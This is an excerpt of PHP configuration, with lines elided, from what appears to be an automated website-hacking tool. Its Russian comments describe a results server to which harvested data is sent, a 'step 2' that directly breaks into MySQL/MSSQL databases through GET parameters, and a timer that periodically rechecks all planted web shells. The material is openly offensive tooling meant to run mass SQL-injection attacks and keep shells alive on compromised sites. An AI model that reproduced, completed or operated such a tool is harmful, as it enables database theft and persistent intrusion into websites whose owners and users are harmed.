<?php
	...
	$this->server_url = 'xxx.xxx.xxx.xxx';//важный параметр впиште ваш IP куда будут слаться результат. Просто доменное имя (IP)без http:// и без слеша в конце
    ...
    $this->login_stop=array('lastloginip','lastlogin','last_login','last_login_ip','date_last_login','datelastlogin','date_last_login','can_last_login');//стоп слова с чем не работаем
     ...
     $this->stop_shag1 = 1000; // ВАЖНЫЙ ПАРАМЕТР ЕСЛИ В ШАГЕ2 СКАПЛИВАЕТСЯ СЛИШКОМ МНОГО К ПРИМЕРУ 1000, ТО ШАГ1 БУДЕТ СТОПАТЬСЯ ПОКА ИХ НЕ ПРОЖУЕТ. Т.К. ШАГ2 БОЛЕЕ ДОЛГИЙ - ЭТО НЕПОСРЕДСТВЕННЫЙ ВЗЛОМ. ВЛИЯЕТ НА СКОРОСТЬ. (2) Получение доступа к базам данных GET у MYSQL/MSSQL)
    ...
    $this->time_check_shell=20000;//время перечека всех шелов  333 минуты(5.5 часов)
